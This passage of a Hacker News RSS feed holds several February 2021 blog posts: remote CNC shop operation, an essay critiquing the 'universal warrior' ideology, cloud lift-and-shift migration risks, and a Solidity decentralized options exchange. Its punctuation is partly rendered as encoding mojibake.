then!</p><figure><img src="https://cdn-images-1.medium.com/max/1600/1*ukzIoHs74MRrQd9Xu3ZBJQ.png" alt=""><figcaption>Figure 1. CNC shop&nbsp;camera</figcaption></figure><p>Much less coordination was required and we were much more confident operating the CNC machine knowing that the site was safe for operation. Setups became easier because we could verify that the right measurements were made.</p><p>Soon enough we‚Äôve found many things that could be improved:</p><ul><li>Running cameras in one window and remoting in on another tended to be inconvenient on a single screen workstation;</li><li>Although monitoring was much better, the single-camera setup did not allow to evaluate the quality of the finish or how smoothly the work was progressing;</li><li>When we were executing tool adjustments (eg. changing a bit in the tool chuck ) it was still hard to be sure that the right tool was where it needed to be;</li><li>It has become very apparent that some of the tasks could be semi-automated using feedback from the on-site worker. For example, at the beginning of each session, the machine needs to be initialised by moving it to reference and calibrating all the tools which involved checking if the site was clear for action and then going through a sequence of clicks;</li><li>Measurements still took a while to explain and then took a while to do properly.</li></ul><h3 id="iteration-3">Iteration 3</h3><p>Taking into account the inefficiencies we‚Äôve identified, we‚Äôve decided to work on a cohesive platform with an intuitive dashboard which would merge all the systems we have and provide the base for automation to be built upon.</p><p>First, was the network setup. We needed to merge multi-site networks into a mesh topology network where all the nodes could be interconnected which was solved using a hub and spoke topology VPN. Although, it does have its own drawbacks it had a good cost-benefit ratio when it comes to setup and deployment and is working for us for now.</p><p>Next, was building the dashboard which not only required the making of the UI but required figuring out how we‚Äôre going to expose and manage resources in our shop network. We decided to build the backend in the spirit of Kubernetes, so it is easy to manage at scale with the addition of new sensors, machines and full-blown sites themselves.</p><figure><img src="https://cdn-images-1.medium.com/max/1600/1*JYyqKIXsBTgfg8A-ENR-xw.png" alt=""><figcaption>Figure 2. CNC shop dashboard prototype</figcaption></figure><p>For the GUI we choose to go with Python‚Äôs Tkinter package in order to be able to rapidly iterate and once it reaches a stable state we‚Äôre planning to move it into a web app for easy access from any device. The dashboard is set up such that one could interface with the embedded CNC software by just doing the relevant actions on the dashboard.</p><h3 id="conclusions">Conclusions</h3><p>Based on our experience using the shop dashboard, it has helped us improve our process in the CNC shop by a mile. We are significantly more confident running remote jobs, have more oversight and control and the process is much more efficient with time.</p><p>It has also opened the possibility to (semi)-automate processes involved in running a CNC shop, which we are continuing to work with and will be posting later. We have a few ideas on how to couple the camera and control system with AI and that is an exciting prospect!</p><p>One key feature that the system requires is being able to remotely access the CNC control software. We are lucky to have it running on a PC which we can easily remote-in, but in case of embedded software, some middleware might be needed to control it remotely.</p><p>Allowing the machine operator to work remote adds value to our business as we could easier relocate the shop to cheaper areas, further from the cities or have talented engineers from nearly anywhere in the world away from work with us. That is why we will continue on this journey and will share it with you as we go!</p><hr><h3 id="check-out-more-">Check out more:</h3><ol><li><a href="https://1d.works/welcome-to-1d-works-cnc-lab/" rel="noopener">Welcome to 1D.works CNC Lab</a></li><li><a href="https://1d.works/object-oriented-computer-assisted-machining/" rel="noopener">Simplifying CAM workflow with Fusion 360</a></li><li><a href="https://1d.works/unique-products-at-scale-with-ai-infused-cad/" rel="noopener">Unique products at scale with AI-infused CAD</a></li></ol><p>and more in our <a href="https://1d.works/blog/" rel="noopener">blog</a></p><hr><h3 id="connect-">Connect!</h3><p>At <a href="https://1d.works/" rel="noopener nofollow noopener noopener">1D.works</a> we‚Äôre excited about the potential of AI to improve businesses and people‚Äôs lives. CAD and CAM are two of the largely unexplored territories we‚Äôre invested in. If you think you can benefit from a decade-long experience of applying machine learning to business processes, <a href="https://1d.works/" rel="noopener nofollow noopener noopener">get in touch</a>!</p><hr><figure><img src="https://cdn-images-1.medium.com/max/1600/1*ZttLaS6wTmFLgKZ6_9LeeA.png" alt=""></figure>
                </div>
            </section></div>]]>
            </description>
            <link>https://1d.works/how-we-started-operating-our-cnc-machines-remotely/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26193769</guid>
            <pubDate>Fri, 19 Feb 2021 14:53:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Universal Warrior, Part III: The Cult of the Badass]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26193719">thread link</a>) | @myWindoonn
<br/>
February 19, 2021 | https://acoup.blog/2021/02/19/collections-the-universal-warrior-part-iii-the-cult-of-the-badass/ | <a href="https://web.archive.org/web/*/https://acoup.blog/2021/02/19/collections-the-universal-warrior-part-iii-the-cult-of-the-badass/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>This is the third and final part of a discussion (<a href="https://acoup.blog/2021/01/29/collections-the-universal-warrior-part-i-soldiers-warriors-and/">I</a>, <a href="https://acoup.blog/2021/02/05/collections-the-universal-warrior-part-iia-the-many-faces-of-battle/">IIa</a>, <a href="https://acoup.blog/2021/02/12/collections-the-universal-warrior-part-iib-a-soldiers-lot/">IIb</a>) discussion of the notion that there is a ‚Äòuniversal warrior‚Äô ‚Äì a transcendent sameness about either the experience of war or ‚Äòwarrior values‚Äô which might provide some sort of useful blueprint for life generally or some sort of fundamental truth about the experience of war.</p>



<p>Over the last three weeks, we‚Äôve looked at the historical evidence to see if there was any hint of some universal war experience or set of warrior values.  What we‚Äôve found instead is that almost everything about how humans engage in war, aside from the fact that they do so, varies tremendously from one culture to the next, from one place to the next, from one period to the next.  Cultural expectations, social values, technological conditions, entire systems of warfare and simple circumstance also condition the experience of war and the values that combatants have in extreme ways which render the search for a ‚Äòuniversal‚Äô set of warrior values a clearly doomed enterprise.</p>



<p>But, as laid out in the beginning, the ‚Äòuniversal warrior‚Äô wasn‚Äôt merely a (deeply flawed) argument about the structure and experiences of the past, but the foundation stone in an ideological blueprint for living one‚Äôs modern life.  And so it is time now that we turn from the (quite bad) historical roots of this idea to the (worse, it turns out) ideological implications of the idea.</p>



<p>But first, as always, if you like what you are reading here, please share it; if you really like it, you can support me on <a href="https://www.patreon.com/user?u=20122096">Patreon</a>. And if you want updates whenever a new post appears, you can click below for email updates or follow me on twitter (@BretDevereaux) for updates as to new posts as well as my occasional ancient history, foreign policy or military history musings.</p>






<p>(I couldn‚Äôt decide quite how I wanted to illustrate this essay and it didn‚Äôt seem like quite the right content for historical cat photos, so I‚Äôve opted to leave it without images.  I may go back and add pictures at a later date, but for now, it can stand purely as an essay.)</p>



<h2>Once More, With Feeling</h2>



<p>In a sense, while the previous three posts have been fun, they were really just a very long preamble to the argument I am making here, so I want to both lay out <em>why</em> I opened with a three-week long preamble before getting to the point (‚Äòhow else would you know it was me?‚Äô) and also pull together the conclusions from all of that before we move forward.</p>



<p>So why the preamble?  Because I wanted to make sure before we started discussing the underlying ideology that lurks <em>behind</em> claims of the universality of some ‚Äòwarrior ethos‚Äô we had defused the retort that, whatever the unpleasant implications, the ‚Äòuniversal warrior‚Äô was <em>historically true</em>.  This had to be done first because <strong>I am of the opinion that</strong> <strong>truth is an absolute defense</strong> in such matters; the universe contains a great many facts which are frustratingly inconvenient, yet as historians we have to deal with the world as it is rather than as we wish it to be (or wish it to have been).  Consequently, before I could complain about the ideology, it was necessary to determine if the historical theory was true, or even remotely plausible.</p>



<p>So we have spent three weeks hunting for the ‚Äòuniversal warrior‚Äô ‚Äì either in the form of a universal war <em>experience</em> or a universal set of <em>values</em>.  What we have found is:</p>



<ul><li>Far from there being one set way that combatants relate to their society, soldiers, warriors and civilians represent distinct categories defined by how people in war relate to their society.  Even <em>within</em> those categories, variety is considerable, leaving no one clear model of how combatants relate to their societies.</li><li>Moreover, war itself is changeable, moving through at least three (and probably four) distinct systems of land warfare alone, each with substantial differences in tactics, values, and experiences.</li><li>Moreover, different cultures understand and imagine the ideal qualities of combatants differently, often so dramatically differently that one culture‚Äôs definition of courage is not merely different from an other‚Äôs, but diametrically opposed.</li><li>Moreover, the actual experience of battle ‚Äì we discussed this mostly through the experience of fear ‚Äì isn‚Äôt universal either.  The fear of facing a cavalry charge is not the same sort of fear as the fear of enduring a week long artillery barrage, while ‚Äòwar is scary‚Äô in a general sense is hardly enough to set off the warrior or the soldier from any number of other scary and potentially hazardous jobs.</li><li>Moreover, the bonds of comradeship that support modern cohesion (often cited as a unique and universal experience) are, in fact, also historically contingent, both in that there are many systems for generating cohesion, not all of which involve tight bonds formed during military service and that some military systems don‚Äôt seek to develop cohesion in this sense at all.</li><li>Moreover, attitudes towards the hardships of war <em>also</em> vary wildly, as do the actual hardships in question.</li><li>Moreover, not only do different societies express different attitudes and values towards the wounded, but the nature of the wounds themselves has changed over time as military technology has become progressively more lethal; both states that apply not only to physical, but also mental wounding.</li></ul>



<p>In short, while there is enough commonality in war to suggest a definition that encompasses the idea (again, I rather prefer W. Lee‚Äôs definition of war as ‚Äúorganized group activity, conducted with lethal effects, that diminishes one [unconsenting] group for the benefit of another‚Äù), <em>within </em>that definition, <strong>there is far too much variety to suggest there is any one ‚Äòuniversal‚Äô experience of war or any one set of universal warrior values</strong>.</p>



<p>And I should note this is something we could demonstrate in more than a half-dozen different ways deploying just a fraction of the available scholarship on how the experience and values of war change from place to place.  Indeed, that is essentially what we have done.  <strong>Any <em>one</em> of the above points is enough to be fatal to the notion that there is some sort of ‚Äòuniversal‚Äô set of warriors values and experiences </strong>such that, as Pressfield openly states, a Spartiate could be simply dropped into a modern U.S. Marine regiment and fit in without skipping a beat (or his equally anachronistic notion that the decadent Athenian could be dropped into American civil society and also integrate seamlessly).  </p>



<p>But of course Pressfield isn‚Äôt offering a <em>history</em> (and indeed, he has not written one), he is offering an ideology and (intentionally or not) reshaping the historical facts to fit that ideology, shaving the corners off of the square peg so it will fit into the round hole of his moral assumptions.  His ideology requires a universal set of warrior values to serve as the foundation for his life philosophy and so, facts be damned, he <em>will</em> assert the existence of such a universal set of values.  The ideology, not the history, is the foundation, which is why Pressfield offers both anecdotes from Plutarch (a historical source) and his own books (modern historical fiction) as having equal truth value, even though the latter has no value as historical evidence; they both <strong>express the ideology</strong>.</p>



<p>So what is the ideology here?  Well, for that it is time to meet our old friend‚Ä¶</p>



<h2>The Cult of the Badass</h2>



<p>Pulling out the core ideology from Pressfield‚Äôs <a href="https://stevenpressfield.com/category/the-warrior-archetype/">videos </a>is a formidable task; there are fifty of them and so much of the core argument is submerged beneath endless anecdotes (some historical, some Pressfield openly invented for his historical fiction; all delivered with insufficient historical context).  But Pressfield‚Äôs videos are useful for this argument because he makes explicit a set of arguments which are usually only made <em>implicitly</em> through a set of emotional appeals which often are carried through the subtext of images and references rather than the text of what is being said.</p>



<p>(Marching through Pressfield‚Äôs videos was also frankly difficult because there are <a href="https://twitter.com/BretDevereaux/status/1350655580562731011"><em>just so many errors</em> </a>in them, I had to stop live-tweeting my way through them because if I kept doing it I‚Äôd never finish.  As a reminder, this is a fellow whose fiction<a href="https://en.wikipedia.org/wiki/Gates_of_Fire"> is on reading lists </a>at various U.S. military officer training programs, much to my continued sorrow.)</p>



<p>We may, I think, summarize Pressfield‚Äôs core argument as follows: the ‚Äòwarrior archetype‚Äô (he is using here the long-abandoned psychology of Carl Jung) represents a true human universal best understood by certain ‚Äòwarrior societies‚Äô (<em>especially</em> the Spartans, but also Alexander III, but somehow <em>not</em> the Macedonians or Philip II) who supposedly demonstrated martial excellence and who therefore are ‚Äúrepresentative of the purest expression of the warrior archetype‚Äù (his words).  Moreover, Pressfield argues that this understanding of the ‚Äòinner warrior‚Äô provides the best blueprint on which a person might fashion their lives, understanding their weaknesses as an ‚Äòinner enemy‚Äô that must be opposed by ‚Äòwarrior values‚Äô and ‚Äòmental toughness.‚Äô  And while Pressfield will admit that the ‚Äòwarrior archetype‚Äô can go astray (he says this of Alexander, though I‚Äôd argue that Alexander didn‚Äôt so much ‚Äògo astray‚Äô as he ‚Äòkept doing what he had done literally for his entire life, but began doing it to people who thought Alexander would only hurt people <em>they didn‚Äôt like</em>‚Äò), he nevertheless presents this ‚Äòwarrior archetype‚Äô as an expression of the highest possible human ideal.  <strong>In Pressfield‚Äôs ideological framework, it is the great warriors ‚Äì the Spartans, Alexander, Arjuna ‚Äì who stand atop the summit of human physical and moral achievement.</strong>  Non-warriors (mostly women) are valued in as much as they uphold elements of this warrior ideal so that warriors (mostly men) can give those ideals physical expression in action.  Even internal struggles must be reframed as a form of war, to be fought and defeated with the same values that best produce effective real-world violence.</p>


</div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://acoup.blog/2021/02/19/collections-the-universal-warrior-part-iii-the-cult-of-the-badass/">https://acoup.blog/2021/02/19/collections-the-universal-warrior-part-iii-the-cult-of-the-badass/</a></em></p>]]>
            </description>
            <link>https://acoup.blog/2021/02/19/collections-the-universal-warrior-part-iii-the-cult-of-the-badass/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26193719</guid>
            <pubDate>Fri, 19 Feb 2021 14:50:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The lift-and-shift shot clock]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26193678">thread link</a>) | @forrestbrazeal
<br/>
February 19, 2021 | https://acloudguru.com/blog/engineering/the-lift-and-shift-shot-clock-cloud-migration | <a href="https://web.archive.org/web/*/https://acloudguru.com/blog/engineering/the-lift-and-shift-shot-clock-cloud-migration">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-id="8a920a5" data-element_type="widget" data-widget_type="theme-post-content.default"><div><p>The clock ticked loudly. Everybody could hear it.</p><p>I was working with a company that lived in fear. Fear of breaches at their private data center ‚Äî&nbsp; not from hackers, but from the weather. Literal puddles of water formed between the server racks whenever it rained. Legends even told of leftover Fourth of July fireworks stored in a nearby utility closet. The whole place was a time bomb waiting to take down their business: drip drop, tick tock.</p><p>A ‚Äúcloud-native‚Äù architecture strategy, needless to say, was not this business‚Äôs top concern. They had to escape the house of horrors and move into a professionally-managed data center before time ran out. It was a question of survival.</p><p>For that very good reason, Leaky Servers Inc opted for a ‚Äúlift-and-shift‚Äù <a href="https://acloudguru.com/blog/business/what-is-cloud-migration" target="_blank" rel="noopener noreferrer">cloud migration strategy</a>: they dumped their applications into AWS pretty much as-is, with minimal training and refactoring beforehand.</p><p>They beat the clock to get out of their data center. But the race against time to adopt the cloud had only just begun.</p><h5><strong>Lift-and-shift: taking the shot</strong></h5><p>Not every migration story involves literal fireworks. But you can still find businesses choosing lift-and-shift, instead of re-architecting applications for the cloud, for a grab bag of reasons:</p><ul><li>Urgent need to get out of a data center (because your servers are haunted, or maybe just because of an expiring lease)</li><li>Desire to get some cloud benefits (scalability, lower maintenance, or even lower cost) without incurring the full risk and expense of re-architecting</li><li>As a financial engineering tactic, to shift CapEx burden to OpEx</li><li>As the first stepping stone to cloud adoption, with the goal to take on a more cloud-native approach later, after everyone gets their feet wet</li></ul><p>All these can be reasonable justifications for lift-and-shift. And every one of them is potentially dangerous.</p><p>Because the moment you drop your monolithic, legacy app servers on EC2, you have started a shot clock on your chances for success in the cloud. Tick, tock. Can you hear it?</p><h5><strong>The lift-and-shift shot clock</strong></h5><p>You are buying yourself time with a lift-and-shift migration. Time to figure out your next move, time to train up your team, time to convince the business that cloud has value. But the bill for that time comes due fast, and at a high interest rate.</p><p>That‚Äôs because the cloud doesn‚Äôt run like your old data center. The cost model is different, the skills are new. And if you change your infrastructure without bringing the rest of your organization along with it, you will find your missing competencies creeping up on you.</p><p><strong><i>You need SRE</i></strong></p><p>The cloud scales fast; it‚Äôs made of ephemeral resources and black-box services coordinated across multiple geographical sites, and it generates tons of telemetry. The only way to cope with these challenges in the long term is automation. The discipline of <a href="https://read.acloud.guru/you-need-sre-skills-to-thrive-in-a-serverless-world-kelsey-hightower-340a002b3730?_ga" target="_blank" rel="noopener noreferrer">site reliability engineering</a> may not seem important on Day 1 in the cloud, but the longer you go without it, the more its absence will hurt you.</p><p><strong><i>You need governance</i></strong></p><p>You moved to the cloud to get better insight on IT spend, to push costs down, to manage risk more effectively. How are you going to do that without automation, without tagging, without isolation of the workloads sharing your legacy monoliths? <a href="https://read.acloud.guru/cloud-risk-management-requires-a-change-to-continuous-compliance-mindset-bca7252eecd0?_ga" target="_blank" rel="noopener noreferrer">Continuous compliance</a> isn‚Äôt going to happen when you‚Äôre still treating your cloud resources like pets.</p><p><strong><i>You need a culture of comprehensive learning</i></strong></p><p>To get the most out of the cloud, you need people who understand it. A lift-and-shift migration intentionally delays the process of cloud competency, usually with the stated or unstated assumption that team members will pick up new skills along the way.</p><p>But this <i>doesn‚Äôt just happen. </i>As long as team members are stuck in the same grind of firefighting legacy apps, their cloud knowledge will remain ad-hoc, limited, and insufficient to propel the next stage of cloud evolution. You must intentionally perpetuate a <a href="https://acloudguru.com/resources/importance-of-creating-cloud-culture?_ga" target="_blank" rel="noopener noreferrer">cloud culture</a> ‚Äî through certification training, incentives, and active efforts to refactor for the future.</p><h5><strong>Lift-and-shift is not a stable state</strong></h5><p>The longer you wait to adopt a cloud-native mindset, the more the interest on that lift-and-shift loan compounds. Because your engineers have to do <i>something </i>while they wait for the business to catch up with cloud.</p><p>In the absence of proper SRE, they build highly manual, slow, error-prone operational procedures that drag down <a href="https://baremetrics.com/academy/time-to-value-ttv" target="_blank" rel="noopener noreferrer">time-to-value</a> and <a href="https://stackify.com/calculating-mttr-an-evolution-driven-by-the-rise-of-devops/" target="_blank" rel="noopener noreferrer">MTTR</a>.</p><p>Without a clearly-defined <a href="https://read.acloud.guru/werner-against-the-machine-7d208b81e5eb?_ga" target="_blank" rel="noopener noreferrer">cloud center of excellence</a>, they rely on tribal wisdom and faulty mental models of how cloud operates.</p><p>Lacking cloud-native governance and cost controls, they run the cloud like a data center: expensively. Remember how you went to the cloud to save money? Let me know how that‚Äôs working out after two years of lifted/shifted workloads.</p><p>Every day, those bad habits become more ingrained. You‚Äôre not just bringing your old legacy systems to the cloud. You‚Äôre building a whole new web of poor practices and procedures around them. And as those temporary stopgaps harden into permanence, you‚Äôll see your brightest engineers leaving for less dysfunctional projects.</p><p>Eventually, if you can‚Äôt take the step forward into cloud-native,<i> the positive value created by the lift-and-shift will be overwhelmed by its negative side effects</i>.</p><p><img loading="lazy" src="https://acloudguru.com//app/uploads/2020/02/lift-and-shift-shot-clock.jpg?x64326" alt="" width="974" height="974" srcset="https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2020/02/lift-and-shift-shot-clock.jpg 974w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2020/02/lift-and-shift-shot-clock.jpg 300w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2020/02/lift-and-shift-shot-clock.jpg 150w, https://res.cloudinary.com/acloud-guru/image/fetch/c_thumb,f_auto,q_auto/https://acg-wordpress-content-production.s3.us-west-2.amazonaws.com/app/uploads/2020/02/lift-and-shift-shot-clock.jpg 768w" sizes="(max-width: 974px) 100vw, 974px">If all software eventually becomes technical debt, lift-and-shift migrations are payday loans. The benefits are heavily frontloaded, and the longer you hold onto them, the deeper they put you in a hole.</p><p>So lift-and-shift if you must. If your data center is on fire, lift-and-shift immediately! But don‚Äôt put off a true cloud transformation. Because you‚Äôre racing the shot clock. And as the <a href="https://www.mckinsey.com/industries/retail/our-insights/the-how-of-transformation" target="_blank" rel="nofollow noopener noreferrer">70% failure rate for large-scale change projects</a> attests, the clock likes to win.</p><p>Tick, tock. Can you hear it?</p><hr><h4>Beat the lift-and-shift shot clock with ACG Certification Accelerator</h4><hr><p><i>Forrest Brazeal is an AWS Serverless Hero</i> <i>and enterprise architect who has led cloud adoption initiatives for companies ranging from startups to the Fortune 50.</i></p></div></div></div>]]>
            </description>
            <link>https://acloudguru.com/blog/engineering/the-lift-and-shift-shot-clock-cloud-migration</link>
            <guid isPermaLink="false">hacker-news-small-sites-26193678</guid>
            <pubDate>Fri, 19 Feb 2021 14:47:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a decentralized options exchange on ethereum]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26193585">thread link</a>) | @tcgv
<br/>
February 19, 2021 | https://thomasvilhena.com/2021/02/building-a-decentralized-options-exchange | <a href="https://web.archive.org/web/*/https://thomasvilhena.com/2021/02/building-a-decentralized-options-exchange">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>Decentralized finance (a.k.a. DeFi) is a relatively recent and fast growing field in the crypto space that is providing innovative implementations for financial instruments that rely on ‚Äúsmart contracts‚Äù (actual code files) instead of being subject to control by central financial intermediaries such as brokerages, exchanges, or banks.</p>

<p>I first came across DeFi about six months ago while browsing a hacker news thread on the subject, and became especially interested on the topic. Not much later major financial news portals reported that DeFi had already grown tenfold during the course of 2020, surpassing US$ 11 billion in deposited value with still a few months left to year end<sup>1,2</sup>, nothing less than staggering.</p>

<p>This context motivated me to invest my free time for studying this field more deeply, and since I learn better when I get my hands dirty I ended up developing an experimental project of a <strong>decentralized options exchange</strong> on ethereum which I describe briefly in this post. Also, feel free to browse the project‚Äôs source code on GitHub, which includes a short technical documentation: <a href="https://github.com/TCGV/DeFiOptions">DeFiOptions</a>.</p>

<p>I start with a functional overview of the project and then I get into more details on key DeFi concepts related to it. So don‚Äôt go away just yet if you feel overwhelmed by the vocabulary. Nonetheless, if you‚Äôre not familiar with options trading in traditional stock exchanges, I suggest you take a look <a href="https://en.wikipedia.org/wiki/Option_(finance)">here</a> before proceeding.</p>



<p>So this experimental DeFi options exchange was implemented as a collection of smart contracts written in the <a href="https://en.wikipedia.org/wiki/Solidity">solidity</a> programming language. They enable trading of long and short positions for cash settable call and put european style options. The diagram below gives a glimpse on how traders interact with the exchange, and how components interact with one another.</p>

<p>
  <img src="https://thomasvilhena.com/images/p25/diagram.png" alt="regular-graphs">
  <br><label>Figure 1. Options Exchange Diagram</label>
</p>

<p>The exchange accepts stablecoin deposits as collateral for writing tokenized (ERC20) options, and a dynamic approach has been implemented for ensuring collateral in a more capital efficient way, making use of favorable writer‚Äôs open option positions for decreasing total required balance provided as collateral.</p>

<p>Decentralized price feeds provide the exchange on-chain underlying price and volatility updates, which is crucial for properly calculating options intrinsic values, collateral requirements, and performing settlements.</p>

<p>Because options are tokenized they can be freely traded/transferred between any two parties. Upon maturity each option contract is liquidated, cash settled by the credit provider contract and destroyed to prevent anyone from trading an expired asset. In case any option writer happens to be short on funds during settlement the credit provider will register a debt and cover payment obligations, essentially performing a lending operation.</p>

<p>Registered debt will accrue interest until it‚Äôs repaid by the borrower. Payment occurs either implicitly when any of the borrower‚Äôs open option positions matures and is cash settled (pending debt will be discounted from profits) or explicitly if the borrower makes a new stablecoin deposit in the exchange.</p>

<p>Exchange‚Äôs balances not allocated as collateral can be withdrawn by respective owners in the form of stablecoins. If there aren‚Äôt enough stablecoins available at the moment of the request due to operational reasons the solicitant will receive ERC20 credit tokens issued by the credit provider instead. These credit tokens are a promise of future payment, serving as a proxy for stablecoins since they can be redeemed for stablecoins at a 1:1 value conversion ratio, and are essential for keeping the exchange afloat during episodes of high withdrawal demand.</p>

<p>Holders of credit tokens can request to withdraw (and burn) their balance for stablecoins as long as there are sufficient funds available in the exchange to process the operation, otherwise the withdraw request will be FIFO-queued while the exchange gathers funds, accruing interest until it‚Äôs finally processed to compensate for the delay.</p>

<p>Phew, that‚Äôs it! While implementing the options exchange I came across several challenges, tried different approaches, reverted back and tried again until coming up with this solution. There‚Äôs still work to be done (see ‚ÄúStatus &amp; next steps‚Äù section below), but I‚Äôm confident this foundation is solid enough to support further developments.</p>



<p>Now, let‚Äôs look at some (not alphabetically ordered) key DeFi concepts that play an important role in this project. Feel free to jump ahead some of them if they seem too basic for you, they are included to offer newcomers a more complete introduction.</p>

<h2>Smart contracts</h2>

<p>If you‚Äôre new to ethereum development you must know that smart contracts constitute the source code of decentralized applications (dapp). It‚Äôs solidity code, simply put.</p>

<p>A smart contract defines functions with varying degrees of visibility that perform calculations, modify blockchain state and emit logs. <u>External and public functions are the API of a dapp</u> and can be called by any participant of the ethereum network. Internal and private functions on the other hand can only be called by the smart contract itself or its derivations in the case of the former.</p>

<p>Dapps live in the blockchain, i.e., their source code is stored in its blocks and ran upon demand, somewhat similar to the serverless computing model. Nonetheless the ethereum network guaranties atomicity, meaning that at any given moment only a single function is being executed as if it had the entire blockchain available for itself alone.</p>

<p>When smart contract functions are executed they potentially alter state. If so changes are definitive, persisted into the blockchain and available to be audited by any node in the network. Without getting into too much detail this model of execution is what gives ethereum its decentralized quality, anyone can execute code and anyone can audit executed code.</p>

<p>As I‚Äôve pointed out before feel free to browse the options exchange source code in the <a href="https://github.com/TCGV/DeFiOptions">project‚Äôs GitHub repository</a> at any time for evaluating a range of smart contracts examples.</p>

<h2>Tokenization</h2>

<p>Tokenization is the process of converting physical and non-physical assets into digital tokens on the blockchain. It‚Äôs notably done by implementing the <a href="https://eips.ethereum.org/EIPS/eip-20">ERC20 interface</a> which is nothing more than a definition of functions and events that once implemented allow any network participant to interact with such token for querying total token supply, querying an account‚Äôs token balance, transfering tokens between accounts, and approving token allowances.</p>

<p>By following the ERC20 standard newly created tokens can take advantage of numerous DeFi primitives already available in the blockchain. With that in mind I‚Äôve implemented the options exchange to adopt tokenized options, allowing option writers to easily manage them, for instance for transfering options to a third-party willing to purchase them.</p>

<p>My take on tokenization was to incorporate a base ERC20 implementation into the project‚Äôs repository and make all smart contracts that I needed tokenized to inherit from it:</p>

<div><div><pre><code>import "../utils/ERC20.sol";

contract OptionToken is ERC20 {

	// contract source code
	
}

contract CreditToken is ManagedContract, ERC20 {

	// contract source code
	
}
</code></pre></div></div>

<p>The base implementation allows derived contracts to override base functions definitions for implementing specific behavior such as the credit token interest rate accrual mechanism.</p>

<h2>Stablecoins</h2>

<p>Stablecoins are cryptocurrencies designed to minimize the volatility of the price of the stablecoin, relative to some ‚Äústable‚Äù asset or basket of assets. A stablecoin can be pegged to a cryptocurrency, fiat money, or to exchange-traded commodities.</p>

<p>This project adopts stablecoins pegged to the US dollar. Traders can deposit any of the accepted stablecoins as balance for writing options. It‚Äôs worth noting that these stablecoins are also ERC20 compliant, as to reinforce the importance of this standard. For reference, the table below depicts the market cap for the five biggest stablecoins at this time:</p>

<table>
  <thead>
    <tr>
      <th>Name</th>
      <th>Code</th>
      <th>Market Cap</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>Theter</strong></td>
      <td>USDT</td>
      <td>$ 30.76B</td>
    </tr>
    <tr>
      <td><strong>USD Coin</strong></td>
      <td>USDC</td>
      <td>$‚ÄØ7.28B</td>
    </tr>
    <tr>
      <td><strong>Multi-Collateral Dai</strong></td>
      <td>DAI</td>
      <td>$‚ÄØ2.07B</td>
    </tr>
    <tr>
      <td><strong>Binance USD</strong></td>
      <td>BUSD</td>
      <td>$‚ÄØ1.83B</td>
    </tr>
    <tr>
      <td><strong>Paxos Standard</strong></td>
      <td>PAX</td>
      <td>$‚ÄØ681.87M</td>
    </tr>
  </tbody>
</table>

<p>I‚Äôve decided to adopt stablecoins instead of other cryptocurrencies (such as ether itself) in the hopes of making the options exchange more palpable and appealing to traders that may not be insterested in being exposed to non stable cryptocurrencies while trading options. Also, this decision has helped to reduce code complexity by eliminating the need to constantly perform currencies value conversions between one another.</p>

<h2>Collateralization</h2>

<p>Collateralization is the use of a valuable asset to secure a liability. It is a heavily adopted concept in the DeFi space.</p>

<p>In this project every option is backed by a stablecoin deposit provided as collateral, and if an option writer defaults on his liability, the option holder may seize the asset to offset the loss. Collateralization of assets gives holders a sufficient level of reassurance against default risk.</p>

<p>You can get more details on the exchange‚Äôs collateralization requirements in the <a href="https://github.com/TCGV/DeFiOptions#collateral-allocation">collateral allocation section</a> of the repository documentation, in which I present the ad-hoc formula that‚Äôs being used to achieve improved capital efficiency.</p>

<h2>Oracles</h2>

<p>One of the drawbacks of dapps is that they are isolated from the real-world and are only able to read data that is already persisted in the blockchain. Relying on off-chain data would break the chain of trust, since it would be impossible for other network participants to audit such data to make sure it wasn‚Äôt forged.</p>

<p>Fortunately there‚Äôs a solution to this impediment, Oracles! An oracle is a third-party blockchain component that allows smart contracts within ethereum to receive external data from outside of their ecosystem. For this project decentralized price feed oracles are being used, which employ on-chain consensus protocols for providing ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thomasvilhena.com/2021/02/building-a-decentralized-options-exchange">https://thomasvilhena.com/2021/02/building-a-decentralized-options-exchange</a></em></p>]]>
            </description>
            <link>https://thomasvilhena.com/2021/02/building-a-decentralized-options-exchange</link>
            <guid isPermaLink="false">hacker-news-small-sites-26193585</guid>
            <pubDate>Fri, 19 Feb 2021 14:38:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Writing Our Own Cheat Engine]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26193563">thread link</a>) | @asicsp
<br/>
February 19, 2021 | https://lonami.dev/blog/woce-1/ | <a href="https://web.archive.org/web/*/https://lonami.dev/blog/woce-1/">archive.org</a>
